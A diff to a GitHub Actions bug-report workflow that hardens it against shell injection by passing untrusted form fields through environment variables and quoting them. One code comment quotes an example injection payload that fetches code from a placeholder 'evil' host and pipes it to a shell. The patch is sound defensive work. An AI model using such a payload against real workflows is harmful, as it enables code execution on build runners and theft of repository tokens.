@@ -236,10 +236,12 @@ jobs:
       - name: Assign Maintainers
         if: steps.create-issue.outputs.action == 'created'
         uses: actions/github-script@v7
+        env:
+          ISSUE_NUMBER: ${{ steps.create-issue.outputs.issue_number }}
         with:
           github-token: ${{ github.token }}
           script: |
-            const issueNumber = ${{ steps.create-issue.outputs.issue_number }};
+            const issueNumber = Number(process.env.ISSUE_NUMBER);
             const maintainers = ['PipFoweraker']; // Add other maintainers as needed
             
             try {
@@ -268,15 +270,29 @@ jobs:
             }
 
       - name: Generate Run Log Summary
+        # Untrusted values (client_payload originates from the bug form) enter via
+        # env: and are read as DATA -- `echo "$VAR"` prints them literally, so a
+        # payload like `x"; curl evil|sh; echo "` can no longer break out of the
+        # shell. github.run_id/server_url/repository are GitHub-controlled, so they
+        # stay inline. (Was: user fields spliced straight into the run: text.)
+        env:
+          RPT_TYPE: ${{ github.event.client_payload.type || github.event.inputs.type || 'bug' }}
+          RPT_SOURCE: ${{ github.event.client_payload.source || github.event.inputs.source || 'web' }}
+          RPT_DEDUPE: ${{ github.event.client_payload.dedupeKey || 'N/A' }}
+          RPT_ACTION: ${{ steps.create-issue.outputs.action }}
+          RPT_ISSUE_NUMBER: ${{ steps.create-issue.outputs.issue_number }}
+          RPT_ISSUE_URL: ${{ steps.create-issue.outputs.issue_url }}
         run: |
-          echo "## Bug Report Workflow Summary" >> $GITHUB_STEP_SUMMARY
-          echo "- **Action**: ${{ steps.create-issue.outputs.action }}" >> $GITHUB_STEP_SUMMARY
-          echo "- **Issue Number**: #${{ steps.create-issue.outputs.issue_number }}" >> $GITHUB_STEP_SUMMARY
-          echo "- **Issue URL**: ${{ steps.create-issue.outputs.issue_url }}" >> $GITHUB_STEP_SUMMARY
-          echo "- **Type**: ${{ github.event.client_payload.type || github.event.inputs.type || 'bug' }}" >> $GITHUB_STEP_SUMMARY
-          echo "- **Source**: ${{ github.event.client_payload.source || github.event.inputs.source || 'web' }}" >> $GITHUB_STEP_SUMMARY
-          echo "- **DedupeKey**: ${{ github.event.client_payload.dedupeKey || 'N/A' }}" >> $GITHUB_STEP_SUMMARY
-          echo "- **Workflow Run**: [${{ github.run_id }}](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})" >> $GITHUB_STEP_SUMMARY
+          {
+            echo "## Bug Report Workflow Summary"
+            echo "- **Action**: $RPT_ACTION"
+            echo "- **Issue Number**: #$RPT_ISSUE_NUMBER"
+            echo "- **Issue URL**: $RPT_ISSUE_URL"
+            echo "- **Type**: $RPT_TYPE"
+            echo "- **Source**: $RPT_SOURCE"
+            echo "- **DedupeKey**: $RPT_DEDUPE"
+            echo "- **Workflow Run**: [${{ github.run_id }}](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
+          } >> "$GITHUB_STEP_SUMMARY"
 
   notify:
     needs: create-issue
@@ -284,9 +300,16 @@ jobs:
     if: ${{ (github.event.client_payload && github.event.client_payload.notify == true) || (github.event.inputs && github.event.inputs.notify == 'true') }}
     steps:
       - name: Send Notification
+        # Same fix: the bug-form title/type are untrusted and must not reach the
+        # shell as code. Read via env and echo as data.
+        env:
+          NOTIFY_TITLE: ${{ github.event.client_payload.title || github.event.inputs.title }}
+          NOTIFY_TYPE: ${{ github.event.client_payload.type || github.event.inputs.type || 'bug' }}
+          NOTIFY_ISSUE_NUMBER: ${{ needs.create-issue.outputs.issue_number }}
+          NOTIFY_ISSUE_URL: ${{ needs.create-issue.outputs.issue_url }}
         run: |
-          echo "🐛 New bug report received!"
-          echo "📋 Issue: #${{ needs.create-issue.outputs.issue_number }}"
-          echo "🔗 URL: ${{ needs.create-issue.outputs.issue_url }}"
-          echo "📝 Title: ${{ github.event.client_payload.title || github.event.inputs.title }}"
-          echo "🏷️ Type: ${{ github.event.client_payload.type || github.event.inputs.type || 'bug' }}"
+          echo "New bug report received!"
+          echo "Issue: #$NOTIFY_ISSUE_NUMBER"
+          echo "URL: $NOTIFY_ISSUE_URL"
+          echo "Title: $NOTIFY_TITLE"
+          echo "Type: $NOTIFY_TYPE"
